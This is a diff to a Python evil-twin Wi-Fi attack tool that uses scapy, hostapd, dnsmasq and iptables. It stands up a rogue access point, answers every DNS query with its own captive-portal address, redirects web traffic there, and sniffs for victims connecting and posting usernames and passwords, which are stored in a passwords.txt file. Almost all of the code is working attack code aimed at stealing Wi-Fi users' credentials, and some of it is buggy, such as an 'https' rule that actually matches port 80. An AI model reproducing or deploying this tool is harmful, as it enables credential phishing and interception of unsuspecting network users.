@@ -12,7 +12,7 @@ import http.server
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 from scapy.layers.http import HTTPRequest
 from scapy.layers.l2 import Ether
-
+interface=''
 mac = ''
 victim = ''
 client_AP = dict()
@@ -253,9 +253,6 @@ def configHostapd(iface, net):
 
 
 def configDnsmasq(iface):
-    os.system('service dnsmasq stop')
-    # clear port 53
-    os.system('service systemd-resolved stop')
     # Stop dnsmasq  in case it's active
     os.system('service dnsmasq stop')
     # Flush iptables to avoid conflicts
@@ -268,27 +265,23 @@ def configDnsmasq(iface):
     dnsmasqConfig = ''
     print('[+] Configuring dnsmasq...')
     dnsmasqConfig += 'interface=' + iface + '\n'  # Interface in which dnsmasq listen
-    dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
-    dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'  # Set router to 10.0.0.1
-    dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'  # Set dns server to 10.0.0.1
-    dnsmasqConfig += 'address=/#/10.0.0.1\n'  # Response to every DNS query with 10.0.0.1 (where our captive portal is)
-
+    dnsmasqConfig += 'dhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
+    dnsmasqConfig += 'dhcp-option=3,192.168.1.1\n'  # Set router to 192.168.1.1
+    dnsmasqConfig += 'dhcp-option=6,192.168.1.1\n'  # Set dns server to 192.168.1.1
+    dnsmasqConfig += 'address=/#/192.168.1.1\n'  # Response to every DNS query with 192.168.1.1 (where our captive portal is)
+    dnsmasqConfig += 'address=/www.google.com/216.58.209.2\n'
     f = open(dnsmasqConfigFile, 'w')
     f.write(dnsmasqConfig)
     f.close()
 
     # Set inet address of interface to 10.0.0.1
-    os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')
+    os.system('ifconfig ' + iface + ' 192.168.1.1 netmask 255.255.255.0')
     # route http traffic to captive portal page
     os.system(
         'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
     # route https traffic to captive portal page
     os.system(
         'sudo iptables -t nat -A PREROUTING -p tcp -m tcp -s 10.0.0.0/24 --dport 80 -j DNAT --to-destination 10.0.0.1')
-    # Initialize dnsmasq
-    os.system('dnsmasq -C ' + dnsmasqConfigFile)
-    print('[+] dnsmasq successfully configured')
-
     # Initialize dnsmasq
     os.system('dnsmasq -C ' + dnsmasqConfigFile)
     print('[+] dnsmasq successfully configured')
@@ -313,15 +306,28 @@ def config_portal():
     print('[+] apache2 configured successfully\n')
 
 
-def handler2(pkt):
-    if pkt.haslayer(HTTPRequest):
-        packet = str(pkt)
-        if packet.find('POST'):
-            print("[+] ", pkt.getlayer(Ether).src, " has submitted his username and password "
-                                                   "check /var/www/html/captiveportal/passwords.txt")
-    else:
-        if pkt.haslayer(Ether):
+def dhcp_handler(pkt):
+    global client_AP
+
+    if pkt.haslayer(Ether):
+        if str(pkt.getlayer(Ether).dst).lower() in client_AP:
             print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")
+
+
+def post_handler(pkt):
+    if pkt.haslayer(HTTPRequest):
+        if pkt.haslayer(Ether):
+            pkt.getlayer(Ether).dst == victim
+            packet = str(pkt)
+
+            if packet.find('POST'):
+                print("[+] ", pkt.getlayer(Ether).src, " has submitted his username and password "
+                                                       "check /var/www/html/captiveportal/passwords.txt")
+                return True
+
+
+def sniff_dhcp(iface):
+    sniff(iface=iface, filter='udp and (src port 67 and dst port 68)', stop_filter=dhcp_handler)
 
 
 if __name__ == "__main__":
@@ -353,7 +359,7 @@ if __name__ == "__main__":
     time.sleep(1)
     configDnsmasq(interface)
     time.sleep(1)
-    sniff(iface=interface, filter='(udp and (src port 67 and dst port 68)) or dst port 80', prn=handler2)
+    Thread(target=sniff_dhcp, args=(interface,)).start()
 
     '''print('[+] Flushing iptables...')
     os.system('iptables -F')
@@ -361,5 +367,9 @@ if __name__ == "__main__":
     print('[+] Iptables flushed')
     os.system("killall dnsmasq")
     os.system("killall hostapd")
+    os.system("killall hostapd")
+    os.system("ifconfig interface down")
+    os.system("ifconfig interface up")
+    
     os.system("rm hostapd.conf")
     os.system("rm dnsmasq.conf")'''
